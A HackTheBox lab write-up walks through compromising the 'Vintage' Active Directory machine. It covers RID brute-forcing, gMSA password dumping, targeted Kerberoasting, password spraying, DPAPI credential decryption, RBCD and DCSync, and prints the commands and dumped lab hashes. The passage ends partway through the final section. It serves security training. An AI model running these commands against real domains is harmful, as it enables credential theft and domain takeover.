---
title: "Vintage HackTheBox" 
date: 2025-08-4 23:50:00 0000+
tags: [WriteUp, Vintage, HTB, Enumeration, Active Directory, RID Bruteforcing, ResetPassword, password reuse, MSSQL, DisabledUser, RealmFix, Hash Cracking, Kerberoasting, Lateral Movement, Bloodhound, DPAPI, VaultCred, Privilege Escalation, PreWindows2000, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Vintage_HTB/preview_vintage.png
---
# Vintage HTB Writeup

Vintage is a hard Active directory windows machine on HackTheBox which is based on assumed breach scenario. It focusses on where the NTLM authentication is disabled and we have to use kerberos authentication to carry out our operations starting with a low privileged account we found in the bloodhound analysis that a PreWindows2000 account is present in the domain for which we resets their password and then helps us move laterally in the domain, after that a user is disabled in the domain so we cant kerberoast it, enabling the user and then kerberoast it helps us to gain control over them and retrieve their password and after a quick password spray we discover another user having the same password. After logging in with the newly discovered user we found some DPAPI masterkeys, after decrypting those key we gain a access to a more high privileged user which allows us to do RBCD and then compromise the domain controller by dumping its secrets.

![image.png](/assets/images/Vintage_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services running on the box.

[https://github.com/A45hw1n/Rustmap](https://github.com/A45hw1n/Rustmap)

```bash
rustmap.py -ip 10.129.231.205
```

![image.png](/assets/images/Vintage_HTB/image%201.png)

Looking at the results we can say that this is an Active Directory box, also the domain and the hostname of the box is revealed to us so lets add it to our /etc/hosts file and start with more in depth enumeration.

Also we have initial creds → **P.Rosa / Rosaisbest123**

I will add them to my creds.txt file.

### DNS Enumeration

Lets start with DNS enumeration as port 53 is open.

```bash
dig @dc01.vintage.htb vintage.htb TXT
```

![image.png](/assets/images/Vintage_HTB/image%202.png)

Nothing interesting with the TXT records.

Trying with the MS ones.

```bash
dig @dc01.vintage.htb vintage.htb MS
```

![image.png](/assets/images/Vintage_HTB/image%203.png)

Nothing interesting here too.

### SMB Enumeration

Ports 139 and 445 are also open on the box, so lets try to list some shares present on the box with the given set of credentials.

```bash
nxc smb vintage.htb -u 'p.rosa' -p 'Rosaisbest123'
```

![image.png](/assets/images/Vintage_HTB/image%204.png)

The NTLM authentication is disabled on the box.

Trying with the kerberos authentication.

For Kerberos authentication to work we need to fix the realm, so first lets do that using nxc we can generate a krb5.conf file.

```bash
nxc smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' --generate-krb5-file vintage.conf
```

![image.png](/assets/images/Vintage_HTB/image%205.png)

The contents of the file are

```bash

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB

```

I will copy this config to the /etc/krb5.conf.

After fixing the realm lets try to authenticate with kerberos.

```bash
nxc smb dc01.vintage.htb -k -u 'p.rosa' -p 'Rosaisbest123'
```

![image.png](/assets/images/Vintage_HTB/image%206.png)

We have successful authentication.

Now lets enumerate shares on the machine.

```bash
nxc smb dc01.vintage.htb -k -u 'p.rosa' -p 'Rosaisbest123' --shares
```

![image.png](/assets/images/Vintage_HTB/image%207.png)

Nothing interesting found.

Now next step is to get every user and machine account on the domain.

We can do this using RID cycling attack.

```bash
nxc smb dc01.vintage.htb -k -u 'p.rosa' -p 'Rosaisbest123' --rid-brute
```

![image.png](/assets/images/Vintage_HTB/image%208.png)

We have a lot of users and machine accounts lets save them to usernames.txt file.

We have the usernames file as

```text
Administrator
Guest
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
IT
HR
Finance
ServiceAccounts
DelegatedAdmins
svc_sql
svc_ldap
svc_ark
ServiceManagers
C.Neri_adm
L.Bianchi_adm
```

Also now collect all the data using bloodhound for further analysis.

### Bloodhound

Using rusthound-ce as the ingestor to collect the data.

```bash
rusthound-ce -d vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -f dc01.vintage.htb -c All -z
```

![image.png](/assets/images/Vintage_HTB/image%209.png)

Starting up bloodhound-CE to upload data.

---

Marking **P.Rosa** as owned in Bloodhound, but we did’nt see any outbound object control over this user.

![image.png](/assets/images/Vintage_HTB/image%2010.png)

Looking at the premade cypher queries, the path for unconstrained delegation.

![image.png](/assets/images/Vintage_HTB/image%2011.png)

But it is of no use, we cant get to nowhere with this.

---

Upon further enumeration I found this **PreWindows2000** group.

![image.png](/assets/images/Vintage_HTB/image%2012.png)

The groups with SID 513 and 515 are **Domain Users and Domain Computers.**

Also looking at the machine account **FS01$** machine account, since its in the **PreWindows2000** group we can change its password.

Also **FS01$** has outbound object control.

![image.png](/assets/images/Vintage_HTB/image%2013.png)

It can read the GMSA password of the **GMSA01$** machine account.

For which **GMSA01$** account also contains the outbound object control.

![image.png](/assets/images/Vintage_HTB/image%2014.png)

Has **GenericWrite** over to the **ServiceManagers** group.

So first lets get to this group **ServiceManagers.**

## Exploitation

Lets move laterally and the path we follow is.

![image.png](/assets/images/Vintage_HTB/image%2015.png)

### FS01$

Lets change the password of FS01$ machine account using changepasswd.py from the impacket’s suite.

Since FS01$ is a prewindows2000 account its password is same as its SAMACCOUTNAME. We can confirm this using nxc.

```bash
nxc ldap dc01.vintage.htb -u 'FS01$' -p 'fs01' -k
```

![image.png](/assets/images/Vintage_HTB/image%2016.png)

This confirms that we can change their password.

```bash
/usr/share/doc/python3-impacket/examples/changepasswd.py vintage.htb/'FS01$':fs01@dc01.vintage.htb -newpass 'aashwin10!' -protocol kpasswd
```

![image.png](/assets/images/Vintage_HTB/image%2017.png)

I changed their password to **aashwin10!**

### FS01$ → GMSA01$

![image.png](/assets/images/Vintage_HTB/image%2018.png)

Now this machine account is a part of **Domain Computers** group which can read the GMSA password of the **GMSA01$** account.

We can either use gmsadumper.py to read their password or we can simply dump their GMSA password using NetExec.

Let use NetExec to do this.

```bash
nxc ldap dc01.vintage.htb -k -u 'FS01$' -p 'aashwin10!' --gmsa
```

![image.png](/assets/images/Vintage_HTB/image%2019.png)

Saving these creds to our creds.txt file.

Now marking **FS01$** and **GMSA01$** as owned in the bloodhound.

### GMSA01$ → SERVICEMANAGERS

![image.png](/assets/images/Vintage_HTB/image%2020.png)

Now this **GMSA01$** user can add itself to the **SERVICEMANGERS** group.

Lets abuse this using bloodyAD.

```bash
bloodyAD -u 'GMSA01$' -p 720508f33e5c631765b6f94f89dcc9df --host dc01.vintage.htb -d 'vintage.htb' -k -f rc4 add groupMember 'SERVICEMANAGERS' 'GMSA01$'
```

![image.png](/assets/images/Vintage_HTB/image%2021.png)

Now we are a part of the **SERVICEMANAGERS** group.

Also lets request a TGT for the **GMSA01$** account.

```bash
impacket-getTGT vintage.htb/'GMSA01$' -hashes :720508f33e5c631765b6f94f89dcc9df
```

![image.png](/assets/images/Vintage_HTB/image%2022.png)

![image.png](/assets/images/Vintage_HTB/image%2023.png)

We exported the .ccache file to our environment variable.

**NOW WE HAVE A TGT FOR THE GMSA01$ ACCOUNT WHICH IS ADDED TO THE SERVICE MANAGERS GROUP.**

### SERVICEMANAGERS → SVC_SQL

![image.png](/assets/images/Vintage_HTB/image%2024.png)

Through **SERVICEMANAGERS** we have **GenericAll** on three accounts **SVC_ARK, SVC_SQL, SVC_LDAP.**

Since we have **GenericAll** on the above 3 accounts lets try to kerberoast them.

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -k --no-pass -d 'vintage.htb' --dc-host dc01.vintage.htb
```

![image.png](/assets/images/Vintage_HTB/image%2025.png)

We can see that we didn’t capture the **SVC_SQL** account hash.

This is beacuse that account is disabled and needs to be enabled on the domain.

To enable we can do this;

```bash
bloodyAD --host dc01.vintage.htb -d 'vintage.htb' -k remove uac -f ACCOUNTDISABLE SVC_SQL
```

![image.png](/assets/images/Vintage_HTB/image%2026.png)

After this we can try kerberoasting part again.

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -k --no-pass -d 'vintage.htb' --dc-host dc01.vintage.htb
```

```bash
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (svc_sql)
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$b2f1df3ce65be4d51991536f9130dfe8$d9e566fd6f68b8221a6491cc1481e0e9fd4cc49eda9c507659d6ea848edd800a521ad959b453500890582bd8f2c2f9068b0d05fdf734b85aad9fc723fe58e35ae81c7b74a013d3692cdc14d18f3b6caa90848efa4f80dd66324cee2212553f191eeae1d1ea879c336c0354cd048b2ab703f60c5a324fc31541144331bccef542f6d76becd4638f4ffcca24fbcf8b1b00551d64b828b31075f704347f1cfcf7a345fd18238d45d16ac13fa75208f09e6b189deef852946d1a232a06fa30bb4db9df3de742533ae77a50d748b00fc8266bae2352b56d3d299a3cf13db030fce5363b0a41fc28ec11e57bddc04da8e42998048ee77f2853651bf95780546451c03a168c9d9180ab32c989a44c2e5ffd29b3da0f3979efc48ebe33c839fa30eaa5f984cec5b6638720b83f317ee55d9a10330be686b229c9140db59cc49c892b7320bab5707de61eafde532d191a1d38d54bff0bfb972c1a0d6cdcb785b64cee6b327c777fe80ed2409040ce0f308648b8920ac65639fc0387961ace89e61e5540c887604d51bdb99335b0171b8ebb25f12345dc294c11d40d94bb6c9123668e366eb0a988e688a4f61065309d2280ccffd94e85ff4984436e5d59dabc6cb753b5c91f80527191ef3aa53947b3093162c05cc7e2e88e01e38457754e5d400fee033f9e79cbb5a8592128226187992a1e644c5eaab1716cae8cba3e4b6773657dd4da854183b992958c06397c925057e3489b36eeebed564ec50bb65d91c08fb4b53dd0e1613104cf8d9d25e676ffad9b49d6741a2662213aea2e9a22a476eb321055bdf6f6c7a65802c4b438819d68d13088ac7acf99a7d5d9f8669492aea726c63fbed75cf93b581cc1f21418d00519062f76d93ce6c844e9fc9032749807e691cc0d7fa7850797fe3c9b9628c030c2702bbd2e7d5f93edc16f94b9905171382f4fb5d8f2e28936cfb06bbcbe2c9e4a24552c46837ef07021ec45a44187f9ecd3978008acfd34b2a738c5ed4b80b68e3c478cc00f3fcae7de87dc9a520a6163115f9bb97cf6c47257e939119500b6ce129f90691f7d3e04f3d2bc939d096f0bd3f176a3db6c5cb716201b30410fee7ac729032ba3b32240814ae1a20707d193cb72b2d303d564c58536da2e4a3ef8a084a5843603238790ac7e8ea1fd9c22ad58815afd0d32255f59dfca6d590a4e1878813bff0ac4c08958a2043b1b8358e96ac00eed2e9eb13860a005518698380a053172f904ef1b01da9e431fbfe284537b7e89647d081e6c042d3579aa4643633812b5fd47a6c3d3d48c24e36d0e3ff9577698a84c51687c10464f970ace0bfce7a46ff8c259dce16b42bfa786c6a0a729dada411d4d1785242ef30a7ac7f67fb8daa3f63bf153af405410e01b1d1c9b4ab4b01d16f8679acc10562edc22762b327d24246a3586e296ba886a1cf7080238f45ad93d
[VERBOSE] SPN removed successfully for (svc_sql)
[VERBOSE] SPN added successfully for (svc_ldap)
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$22f8558785c0c40c02da2d71f64a780e$62fd62856d433a49371be32fa82dbe6b477e6a335349d3f726354101c0b6eb9c5bea8323208f2ce44c5c15a85aa1606566d64e68b8193f0e2cc5e8d5c783477008a68d140e402129f7c13e331bdfc4eca27d7729ae0d90482a2d65a97da40552ae9dde295c504f60e1336fb1072658cb1d6277db2325494cad5b861c6ea37bd2dea717177cbb8b328f7075994dc92f7facfbc3afb6650a454f726b55fecf3407c44672cb9988c8e7058947bbd1a09c084cb66b375c8972db73340e01adcad41164c825de5cc0904b27b9fec58a91595ced15e6ec2afd4c680d19d0d7f17c18e24eccc2e61f3b1f5d07ba19579eb71ac23c545fb9fe1750ebe45ecc201c02692eb35ebf017595d630092fce3005c3ea49acf3dea3c0cd575adf11d44db7cf2e121fb540776f847d04d18ab1be6611112a34fd8dc3eab0a477f0c56a552867cfdaa1947c1ac319adc1cef01828d57e7262f26925416607ddfafc3e530b69e12f76dc677fb463a59b61a0d2c3a31156da2992d94738c4b0993586c53821b26690292b6006490b50913a84af0731a4c0d7e18097b34b5e606efa43e36342ed4850cc48d22f5ad2590f7490fa7529879d41aa9484255e839387bd7fcc650c46e337a733ada93633ec587022382c24537dbc4b23c8a5765f4f65b13db9cf7154fd108601fcf87c68f1187637f4d563487f73bfe312930b68b3144283ec3c1be446572876511af9f341ddc5f8e43adebcd58a3f7174093a23d4b01118e126d2cde6672510279f5269955b9bcb4cfe7c3e41b91f5d583740acbf34178b59d3881d2d2de70088cb8164d60ddf03bbc808ba1f14c7baebafcede528a31f8859845eacc051c0358ce1e9aaebaf375c0ca708c6bb6bf4a3c8a35237c886ee66c33fef6f4feb0ca176751eb15b8470239b30dd45ee5edda14ad5857ccf86b1c469c55bb6a336a865426e0fe5586eb44b0804e1bc736a31cf276bd0ea8af6d03b6837991c420fde441ee263036eea732e669e54103c26238f10c198cfd3de5a79ff61cfef59073be5143d2b72a9cb3d4c539f941911cc557f226ba9eaaa5b686833fada8a7c8d98d7c5e360077681f0886c8822c5a795bc68077379819a1fae226432922f4ce603822c8a34c0178a3accc0121f84252ae18d56a9eacde874b6e998a71abd4341822d5d8adbcc200aa2b44cf71d467dcd9a05837c4f9072629b282a201dba0bcdfcbdb40c021363209ec10dda289b4fb6b5f32c2bbfe00574bed431b80705f9849ebe48be0636249fa1d574a45846e1db3f7d3b3ad5bae4db860e1605d38be0ab167bbe272f1adc30eb362a86babd944504e63449d46cf1ec556af0bb2546010aa9253f24279d748b11a97bb21edfe04f70756fb5a2d422ef4f904dbf64a26a4fad87b4472d158995d6354ba78362dcf68262f5b12b32fbc446f1e2bbbc52b6a8acfdfce
[VERBOSE] SPN removed successfully for (svc_ldap)
[VERBOSE] SPN added successfully for (svc_ark)
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$19cf8e1365d4a13dfe927b6344f7cd22$6ec2e64d010961eb7aacc62ede43daf12f951d99b06d1c37510ca3f7736da81de9b061d1afeb3dce746e8788ef089a1a31dd9033460149a026cb2ad00f8f2015e69843191efcc759f6948a3952b4cb0dc891f9bac78f03c6322c5d6e8c894670671a8ed5f721bf57780148612c5c37aab39468cdd2701e9e04a7a586754bddba0faafb248452b7b680d340eda9b3a162c8043bcdffcb5e2b865e71304fa71ad0d3fbcc99cca0d42ce1b6e8a7fda52bc37e9bc9d5c0d9b2245790458e800c448cb5def8592caf1285d7f90634f075fc6c751a3f667fbd652996f5830168b7e5556ed4b83afca852a9cbd5f0a36b84b81762836bd48133ca65dea2005ca8bfcad01cbb04a92bdbeee80d833af5f5bb3e85d876c3a6d051eb44e3cb9fc64cbf48638773273632c8f649dba3e5bee30c56e1631587c0477a34bbe705f59a2020517c6736291fc5041878e560e02088e20fd6d6c418592e6bad315c7d271b4feb779a3d075bbf030f51a57deb9b5ec842bfc788fcca671485e5cce7d2e9d62e0565178a48e51f2c0d1d76b06bedd5e37aaaf0a228c475fe47d553f438cc777ae6bcc637ddf5c5ae264c96fcd9254fa9c74278346a5bd4d1068b7c7e4d11729797e35c519c7a215eaa030cf785737ce60879cd1dcf706fd2b36543c2b11e2486a6731c562d6d8e89783e3496d03a2d588475a9ee48b0696c81500045b029f3935f7bf1873107454d2b2f1e66b88862a4ff830dad6081d016c9a80bb821bf947167eaaa472aefc34d25ce2e7d9c34aff4e90d04ef162777c281d669bd1a44b82d8bcd0182f19e6b466ca3c352a38c1d3a5dbbc8c03228ce0b10b7bff634d4cffed8f97fb1ce7d0fe869df176e88ef6b19ee68bf29c33af1f4bca8c61cdd5ed35aef7c361d5dbdc657541e63ba9ba7c641d7b77c497467a7a1105c96b77264aff9b3d25f7c8b79e529739f6cf21a8c4ab8ca562c4886afc998cc9c36fd2cddd0c4135cbc3477b7c56fa211218326745e4ae4815eb706757f711722ec60c213977707b53a25449a40455fb25e9233e5b996bc41e7dd16bd3a7ef2196499e1d6438a969a1ddfc82a4e029a8b2104260de24a01e7f80ae8ecd7c4e8537c3e07ff81b575c901e65af33bdeb66401a3e6df81cb3afae83cb3097fa9b91f91b93948ec495dc0b443bdd5425b61a593526aa2636ada8d9b073834b24be0a8aef5f4aed4387116532aef43ce46f6517a87461b4ef80b6ca4fc534e36c00515be75cbe17a467433a03f191a90ed622d375b7f865565bbff4e96e4799a0af60a95c05f66240c1e3e2737c4937d1829ad35a6f10218ef562f99afb7990e04f62b569a02a8b985017798a7051e9abaded0c64fba910de6a5ed74c8deaaad30d43205f350f3f0b751dcb33cc88ff13812600b71463832988686126fe2a9a276138bff15b2f60adcc53ee9e366d0
[VERBOSE] SPN removed successfully for (svc_ark)
```

Now we have the hash of the SVC_SQL account.

Lets crack the password of these hashes using Hashcat.

```bash
hashcat -m 13100 svc_sqlhash.txt svc_ldaphash.txt svc_arkhash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Vintage_HTB/image%2027.png)

We were able to crack the hash for the **SVC_SQL** account, lets verify that.

```bash
nxc ldap dc01.vintage.htb -k -u 'svc_sql' -p 'Zer0the0ne'
```

![image.png](/assets/images/Vintage_HTB/image%2028.png)

### Password Spray

Now I get to anywhere after getting the credentials for the **SVC_SQL** account. So I enumerated the domain more and still wasn’t able to find anything.

Also for now I have created a passwords.txt file as we have some credentials and the users on the box to perform a password spary.

The potential passwords are.

```text
Zer0the0ne
aashwin10!
Rosaisbest123
```

The usernames are.

```text
Administrator
Guest
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
IT
HR
Finance
ServiceAccounts
DelegatedAdmins
svc_sql
svc_ldap
svc_ark
ServiceManagers
C.Neri_adm
L.Bianchi_adm
```

Using NetExec to perform the password spary.

```bash
nxc ldap dc01.vintage.htb -u usernames.txt -p passwords.txt -k --continue-on-success | grep "[+]"
```

![image.png](/assets/images/Vintage_HTB/image%2029.png)

We have a new hit as **C.Neri** on the domain. 

### Shell as C.Neri

We have valid credentials as C.Neri now lets authenticate and verify them, also saving these credentials to our creds.txt file.

```bash
nxc ldap dc01.vintage.htb -k -u 'c.neri' -p 'Zer0the0ne'
```

![image.png](/assets/images/Vintage_HTB/image%2030.png)

Checking for the winrm access.

```bash
nxc winrm dc01.vintage.htb -k -u 'c.neri' -p 'Zer0the0ne'
```

![image.png](/assets/images/Vintage_HTB/image%2031.png)

It failed cause of the NTLM is disabled on the box.

Okay, so lets try to get a TGT with C.Neri and then try to authenticate using Evil-Winrm

```bash
impacket-getTGT vintage.htb/'c.neri':Zer0the0ne
```

![image.png](/assets/images/Vintage_HTB/image%2032.png)

Now lets do our Evil-winrm authentication.

```bash
evil-winrm -i dc01.vintage.htb -u c.neri -r vintage.htb
```

![image.png](/assets/images/Vintage_HTB/image%2033.png)

And we have a shell.

Grabbing that user.txt present in the user’s desktop.

![image.png](/assets/images/Vintage_HTB/image%2034.png)

Submitting the user.txt flag and marking **C.Neri** as owned in Bloodhound.

### C.Neri → C.Neri_adm

I uploaded winpeas.exe to the target system using evil-winrm and it find this DPAPI master keys and the Credentials.

So lets download them.

Downloading the DPAPI Master Keys.

![image.png](/assets/images/Vintage_HTB/image%2035.png)

Downloading the Credential file.

![image.png](/assets/images/Vintage_HTB/image%2036.png)

We now have the Credential file and both the master keys.

Using impacket’s DPAPI.py to decrypt these master keys using **C.NERI** password.

```bash
impacket-dpapi masterkey -file 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -password 'Zer0the0ne' -sid S-1-5-21-4024337825-2033394866-2055507597-1115
```

![image.png](/assets/images/Vintage_HTB/image%2037.png)

```bash
impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -password 'Zer0the0ne' -sid S-1-5-21-4024337825-2033394866-2055507597-1115
```

![image.png](/assets/images/Vintage_HTB/image%2038.png)

Saving these both the Decrypted keys to a file.

Now lets extract the secrets using the Credentials file.

```bash
impacket-dpapi credential -f 'C4BB96844A5C9DD45D5B6A9859252BA6' -key '0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f'
```

![image.png](/assets/images/Vintage_HTB/image%2039.png)

Using the second decryption key.

```bash
impacket-dpapi credential -f 'C4BB96844A5C9DD45D5B6A9859252BA6' -key '0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a'
```

![image.png](/assets/images/Vintage_HTB/image%2040.png)

We got the credentials for the **C.NERI_ADM** user.

Saving that credentials to our creds.txt file.

### C.Neri_adm → DelegatedAdmins

Marking C.Neri_adm as owned in bloodhound.

![image.png](/assets/images/Vintage_HTB/image%2041.png)

I am already a member of **DELEGATEDADMINS.**

![image.png](/assets/images/Vintage_HTB/image%2042.png)

As a member of **DELEGATEDADMINS** we have **AllowedToAct** on the DC. Which means that we need a SPN to be a able to impersonate a user and **C.NERI_ADM** doesn’t have it set.

### FS01$ → DELEGATIONADMINS

We will use the **FS01$** machine account for this as it has SPN set.

![image.png](/assets/images/Vintage_HTB/image%2043.png)

So lets add **FS01$** to the **DELEGATIONADMINS** group.

---

First I will request a TGT for the **C.Neri_adm** user.

```bash
kinit c.neri_adm
```

![image.png](/assets/images/Vintage_HTB/image%2044.png)

Now lets add **FS01$** to the **delegatedadmins** group.

```bash
bloodyAD --host dc01.vintage.htb -d 'vintage.htb' -k add groupMember 'DELEGATEDADMINS' 'FS01$'
```

![image.png](/assets/images/Vintage_HTB/image%2045.png)

Now requesting a TGT for the **FS01$** which is added to the **DELEGATIONADMINS** group.

```bash
impacket-getTGT vintage.htb/'FS01$':'aashwin10!'
```

![image.png](/assets/images/Vintage_HTB/image%2046.png)

After saving the ticket to our environment variable.

Lets now request a Service Ticket impersonating the DC.

```bash
impacket-getST -spn 'cifs/DC01.VINTAGE.HTB' -impersonate 'DC01$' vintage.htb/'FS01$'
```

![image.png](/assets/images/Vintage_HTB/image%2047.png)

Lets confirm this ccache file using NetExec.

```bash
KRB5CCNAME='DC01$.ccache' nxc smb dc01.vintage.htb -k --use-kcache
```

![image.png](/assets/images/Vintage_HTB/image%2048.png)

### DCSync → DC01.VINTAGE.HTB

Now we can DCSync to the DC.

First exporting our .ccache file to the KRB5CCNAME linux environment variable.

```bash
export KRB5CCNAME=DC01\$.ccache
klist
```

![image.png](/assets/images/Vintage_HTB/image%2049.png)

Now using impacket’s secretsdump.py to extract secrets from the domain controller.

```bash
impacket-secretsdump -k -no-pass vintage.htb/'dc01$'@dc01.vintage.htb
```

It was successful in grabbing all the secrets from the domain.

```bash
Impacket v0.11.0 - Copyright 2023 Fortra

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:f50d4b6f0996caa3760b382793a7f52c:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:587368d45a7559a1678b842c5c829fb3:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:7743e5e4f86ed6f20083e5849378c660:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
krbtgt:des-cbc-md5:e923e308752658df
M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
M.Rossi:des-cbc-md5:7f2c7c982cd64361
R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
R.Verdi:des-cbc-md5:34464a58618f8938
L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
L.Bianchi:des-cbc-md5:01f2d667a19bce25
G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
G.Viola:des-cbc-md5:7f19b9cde5dce367
C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
C.Neri:des-cbc-md5:9da708a462b9732f
P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
P.Rosa:des-cbc-md5:a423fe64579dae73
svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
svc_sql:des-cbc-md5:2ff4022a68a7834a
svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
svc_ldap:des-cbc-md5:e3c48675a4671c04
svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
svc_ark:des-cbc-md5:6e2c9b15bcec6e25
C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
L.Bianchi_adm:aes256-cts-hmac-sha1-96:ec2a7d628ee1b699ca756e2c0605d846b1ae5318e5ca748140fe431bcb185823
L.Bianchi_adm:aes128-cts-hmac-sha1-96:d55b394c6c646a0f20bc375ae41c437c
L.Bianchi_adm:des-cbc-md5:7561ece36bc84cfe
DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
DC01$:des-cbc-md5:c4f15ef8c4f43134
gMSA01$:aes256-cts-hmac-sha1-96:a46cac126e723b4ae68d66001ab9135ef30aa4b7c0eb1ca1663495e15fe05e75
gMSA01$:aes128-cts-hmac-sha1-96:6d8f13cee54c56bf541cfc162e8a22ef
gMSA01$:des-cbc-md5:a70d6b43e64a2580
FS01$:aes256-cts-hmac-sha1-96:074dfb251fae910df111beba5c6bd677373b6aa44b70c8d1393605c7bb73021a
FS01$:aes128-cts-hmac-sha1-96:d613912ea5f1f2696969d39e62b14581
FS01$:des-cbc-md5:b0e05db6a27a1cef
[*] Cleaning up... 

```

### Authentication as Administrator

Now after grabbing all the keys, all we can do is login as Administrator.

```bash
nxc smb dc01.vintage.htb -k -u 'Administrator' -H '468c7497513f8243b59980f2240a10de'
```

![image.png](/assets/images/Vintage_HTB/image%2050.png)

But it failed and said that **STATUS_LOGON_TYPE_NOT_GRANTED.**

### Shell as L.Bianchi_Adm

Lets check the domain admins group.

